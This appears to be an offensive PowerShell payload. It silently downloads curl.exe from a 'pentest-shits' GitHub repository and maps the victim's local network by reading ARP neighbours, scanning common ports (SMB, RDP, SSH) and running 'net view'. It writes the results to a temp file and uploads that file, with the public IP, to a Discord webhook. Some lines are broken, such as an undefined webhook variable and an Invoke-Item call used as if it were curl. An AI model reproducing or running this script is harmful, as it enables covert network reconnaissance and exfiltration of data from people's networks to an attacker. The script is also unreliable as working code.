    Add-Type -AssemblyName System.Web
    Add-Type -AssemblyName System.Net.Http.dll

    function Export-DataToDiscord {

        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/johnvizzz/pentest-shits/main/binaries/curl.exe" -OutFile "$env:Temp\curl.exe"

        $public_ip = (Invoke-WebRequest -Uri "https://api.ipify.org").Content

        $json = @{
            username = "Network Dijkstrows"
            content = "Network Mapping of $public_ip"
        } | ConvertTo-Json

        Invoke-RestMethod -Method Post -Body $json -Uri $dc -ContentType 'Application/Json'

        $FilePath = "$env:Temp\wlne_results.txt"
        Invoke-Item "$env:Temp\curl.exe" -X POST -H "Content-Type: multipart/form-data" -F "file=@$FilePath" $dc
    }

    function Select-NetworkMachines {
        param (
            [Parameter(Mandatory=$true)]
            [string]$network,
            [Parameter(Mandatory=$true)]
            [string[]]$neighboors
        )

        $neighboors | Where-Object { $_.IPAddress -like "$network*" }
    }


    function Get-MaskedIp {
        param (
            [Parameter(Mandatory=$true)]
            [string]$ip,
            [Parameter(Mandatory=$true)]
            [int]$mask
        )

        [string[]]$ip = $ip.Split(".")
        $mask_idx = $mask / 8
        $mod = ($mask_idx % 8)
        if ($mod -eq 1) {
            $mask_idx = $mask_idx - 1
        }
        $cur = [int]$ip[$mask_idx]

        $cur_mask = $mask - $mask_idx * 8
        $cur = $cur -band (0xff -shl (8 - $cur_mask))
        $ip[$mask_idx] = $cur.ToString()

        $ip = $ip -join "."
        return $ip
    }

    function Get-LocalNetworkInfo {
        $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi-Fi")
        if ($null -eq $ip) {
            $ip = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Ethernet")
            if ($null -eq $ip) {
                Write-Host "Could not retrieve local IP address"
                return $null, $null, $null
            }
        }
        $ip = $ip.IPAddress

        $mask = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi-Fi")
        if ($null -eq $mask) {
            $mask = (Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Ethernet")
            if ($null -eq $mask) {
                Write-Host "Could not retrieve network mask"
                return $null, $null, $null
            }
        }
        $mask = $mask.PrefixLength

        $network = Get-MaskedIp -ip $ip -mask $mask

        $neigh = Get-NetNeighbor -AddressFamily IPv4 -InterfaceAlias "Wi-Fi"
        if ($null -eq $neigh) {
            $neigh = Get-NetNeighbor -AddressFamily IPv4 -InterfaceAlias "Ethernet"
            if ($null -eq $neigh) {
                Write-Host "Could not retrieve neighboors"
                return $null, $null, $null
            }
        }

        $network = $network + "/$mask"
        return $ip, $network, $neigh
    }

    function Get-LocalNetworkMapping {
        $ip, $network, $neighboors = Get-LocalNetworkInfo

        $ret = @()
        foreach ($neigh in $neighboors) {
            $ret += [PSCustomObject]@{
                IP = $neigh.IPAddress
                MAC = $neigh.PhysicalAddress
            }
        }

        return $ip, $network, $neigh, $ret
    }

    $nmap_top_ports = @(
        21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080
    )

    function Get-HostPortMapping {

        param (
            [Parameter(Mandatory=$true)]
            [string]$remote_host
        )

        $ports = @()
        foreach ($port in $nmap_top_ports) {
            $tcp = Test-NetConnection -ComputerName $remote_host -Port $port -InformationLevel Quiet -WarningAction SilentlyContinue
            if ($tcp.TcpTestSucceeded) {
                $ports += $port
            }
        }

        return $ports
    }   

    # enumerate all hosts an write results to a file called "$env:Temp\wlne_results.txt"
    $ip, $network, $neighboors, $remote = Get-LocalNetworkMapping
    if ($null -eq $ip) {
        Write-Host "No network connection found"
        return
    }
    Write-Output "Local Network: $network" | Out-File -FilePath "$env:Temp\wlne_results.txt"
    Write-Output "Local IP: $ip" | Out-File -FilePath "$env:Temp\wlne_results.txt" -Append

    foreach ($neigh in Select-NetworkMachines -network $network -neighboors $remote  | Where-Object { $_.IP -ne $ip } ) {
        $ports = Get-HostPortMapping -remote_host $neigh.IP
        $remote = $remote | Where-Object { $_.IP -eq $neigh.IP }
        $ports = $ports -join ","
        $remote | Add-Member -MemberType NoteProperty -Name "Ports" -Value $ports
        $remote | Select-Object IP, MAC, Ports | Out-File -FilePath "$env:Temp\wlne_results.txt" -Append

    }

    net view | Out-File -FilePath "$env:Temp\wlne_results.txt" -Append

    Export-DataToDiscord